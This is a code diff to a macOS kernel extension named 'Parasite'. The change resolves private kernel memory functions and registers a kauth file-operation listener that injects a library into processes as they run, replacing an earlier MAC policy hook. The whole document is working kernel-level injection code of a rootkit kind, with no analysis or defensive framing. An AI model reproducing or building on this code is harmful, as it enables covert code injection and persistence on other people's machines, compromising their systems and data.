@@ -34,7 +34,7 @@ static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_actio
         //printf("[Parasite] This bird is fly: %s.\n", path);
         vm_map_t task_map = _get_task_map(current_task());
         vm_map_offset_t base_address = _get_map_min(task_map);
-            
+        
         printf("[Parasite] Trying to inject library into %s.\n", path);
         
         if (inject_library(task_map, base_address, path, sizeof(path))) {
@@ -107,8 +107,29 @@ kern_return_t Parasite_stop(kmod_info_t *ki, void *d);
 kern_return_t Parasite_start(kmod_info_t *ki, void *d)
 {
     printf("[Parasite] Hello, I'm in memory.\n");
+    if (!kernel_symbols_solved) {
+        if (init_kernel_info()) return 0;
+        
+        SOLVE_KERNEL_SYMBOL("_get_map_min", _get_map_min)
+        SOLVE_KERNEL_SYMBOL("_get_task_map", _get_task_map)
+        SOLVE_KERNEL_SYMBOL("_mach_vm_region", _mach_vm_region)
+        SOLVE_KERNEL_SYMBOL("_mach_vm_protect", _mach_vm_protect)
+        SOLVE_KERNEL_SYMBOL("_vm_map_read_user", _vm_map_read_user)
+        SOLVE_KERNEL_SYMBOL("_vm_map_write_user", _vm_map_write_user)
+        
+        kernel_symbols_solved = TRUE;
+    }
     
-    return mac_policy_register(&Parasite_policy_conf, &Parasite_policy_handle_t, d);
+    listener = kauth_listen_scope(KAUTH_SCOPE_FILEOP, &infection_overwatch, NULL);
+    
+    if (listener == NULL) {
+        printf("[Parasite] Damn, could not create listener.");
+    } else {
+        listener_initialized = TRUE;
+    }
+    
+    //    return mac_policy_register(&Parasite_policy_conf, &Parasite_policy_handle_t, d);
+    return listener != NULL ? KERN_SUCCESS : KERN_FAILURE;
 }
 
 kern_return_t Parasite_stop(kmod_info_t *ki, void *d)
